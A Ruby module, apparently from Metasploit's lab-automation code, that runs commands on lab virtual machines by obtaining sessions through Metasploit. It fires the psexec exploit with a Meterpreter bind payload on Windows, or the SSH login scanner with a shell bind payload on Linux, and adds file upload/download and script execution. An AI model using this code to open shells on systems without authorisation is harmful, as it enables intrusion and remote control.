$:.unshift(File.join(File.dirname(__FILE__), '..', '..'))

# This allows us to override the default way of running commands
# Currently useful for the remote esx driver

module Lab
module Modifier
module Meterpreter

	attr_accessor :framework
	attr_accessor :session
	attr_accessor :session_input
	attr_accessor :session_output

	def meterpreter_run_command(command, timeout=60)
		
		setup_session
		puts "Using session #{@session}"
		
		# TODO: pass the timeout down
	
		if @session
			if @session.type == "shell"
				puts "Running command via shell: #{command}"		
				@session.shell_command_token(command, timeout)
			elsif @session.type == "meterpreter" 
				puts "Running command via meterpreter: #{command}"		
				@session.shell_command(command) #, timeout)
			end
		else
			raise "No session"
		end
	end
	
	def meterpreter_copy_to_guest(local,remote)
		puts "DEBUG: Meterpreter"
		setup_session
		if @session.type == "meterpreter"
			@session.run_cmd("upload #{local} #{remote}")
		else
			@driver.copy_to(local,remote)
		end
	end
	
	def meterpreter_copy_from_guest(local, remote)
		puts "DEBUG: Meterpreter"
		setup_session
		if @session.type == "meterpreter"
			@session.run_cmd("download #{local} #{remote}")
		else
			@driver.copy_from(local,remote)
		end
	end

	# This isn't part of the normal API, but too good to pass up. 
	def meterpreter_run_script(script, options)
		if @session.type == "meterpreter"
			@session.execute_script(script, options)
		else
			raise "Unsupported on #{@session.type}"
		end
	end

private

	def create_framework
		return if @framework
		@framework	= Msf::Simple::Framework.create
	end

	# perform the setup only once
	def setup_session
		return if @session

		# require the framework (assumes this sits in lib/lab/modifiers)
		require 'msf/base'

		create_framework # TODO - this should use a single framework for all hosts, not one-per-host

		@session = nil
		@session_input	= Rex::Ui::Text::Input::Buffer.new
		@session_output	= Rex::Ui::Text::Output::Buffer.new
	
		if @os == "windows"
			exploit_name = 'windows/smb/psexec'

			# TODO - check for x86, choose the appropriate payload

			payload_name = 'windows/meterpreter/bind_tcp'
			options = {	
				"RHOST"		=> @hostname, 
				"SMBUser"	=> @vm_user, 
				"SMBPass"	=> @vm_pass}

			puts "DEBUG: using options #{options}"

			# Initialize the exploit instance
			exploit = @framework.exploits.create(exploit_name)

			begin
				# Fire it off.
				@session = exploit.exploit_simple(
					'Payload'     	=> payload_name,
					'Options'     	=> options,
					'LocalInput'  	=> @session_input,
					'LocalOutput' 	=> @session_output)
				@session.load_stdapi
				
				puts "DEBUG: Generated session: #{@session}"
				
			rescue  Exception => e 
  			  puts "DEBUG: Unable to exploit"
  			  puts e.to_s
			end
							
		else
			module_name = 'scanner/ssh/ssh_login'
			
			# TODO - check for x86, choose the appropriate payload
			
			payload_name = 'linux/x86/shell_bind_tcp'
			options = {	"RHOSTS"		=> @hostname, 
					"USERNAME" 		=> @vm_user, 
					"PASSWORD" 		=> @vm_pass, 
					"BLANK_PASSWORDS" 	=> false, 
					"USER_AS_PASS" 		=> false, 
					"VERBOSE" 		=> false}

			puts "DEBUG: using options #{options}"

			# Initialize the module instance
			aux = @framework.auxiliary.create(module_name)
			
			puts "DEBUG: created module: #{aux}"
			
			begin 
				# Fire it off.
				aux.run_simple(
					'Payload'     => payload_name,
					'Options'     => options,
					'LocalInput'  => @session_input,
					'LocalOutput' => @session_output)
				
				@session = @framework.sessions.first.last
				puts "DEBUG: Generated session: #{@session}"
			rescue Exception => e 
			  puts "DEBUG: Unable to exploit"
			  puts e.to_s
			end
		end
	end
end
end
end

